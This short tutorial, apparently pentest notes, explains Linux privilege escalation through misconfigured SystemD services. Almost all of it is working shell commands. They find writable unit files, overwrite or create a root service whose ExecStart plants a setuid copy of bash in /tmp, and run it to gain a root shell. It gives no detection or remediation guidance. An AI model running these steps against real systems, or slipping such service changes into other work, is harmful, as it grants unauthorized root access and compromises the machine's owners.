# Privilege Escalation via SystemD Misconfigurations

## Overview
The `systemctl` binary is a command used in Linux systems to manage services through SystemD, such as Apache, MySQL, and SSH. Because of its impact on the system, it is generally reserved for privileged users, such as system administrators. However, misconfigured permissions for `systemctl` may allow attackers to escalate privileges.

---

## 1. Exploiting Writable SystemD Service Files

If a user has **write permissions** on a SystemD service file that runs as root, they can modify it to execute arbitrary commands.

### **Find writable service files:**
```sh
find /etc/systemd/system/ -type f -writable 2>/dev/null
```

### **Modify the service file:**
```sh
echo -e "[Service]\nExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'" | sudo tee /etc/systemd/system/vulnerable.service
```

### **Reload and restart the service:**
```sh
sudo systemctl daemon-reload
sudo systemctl restart vulnerable.service
```

### **Escalate privileges:**
```sh
/tmp/rootbash -p
```

---

## 2. Creating a New SystemD Service

If a user can **create a new service in `/etc/systemd/system/`** and also has **sudo privileges on `systemctl`**, they can escalate privileges.

### **Create a malicious service file:**
```sh
cat <<EOF > /etc/systemd/system/root.service
[Unit]
Description=Root Shell

[Service]
Type=simple
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'

[Install]
WantedBy=multi-user.target
EOF
```

### **Enable and start the service:**
```sh
sudo systemctl daemon-reload
sudo systemctl enable root.service
sudo systemctl start root.service
```

### **Escalate privileges:**
```sh
/tmp/rootbash -p
```

---
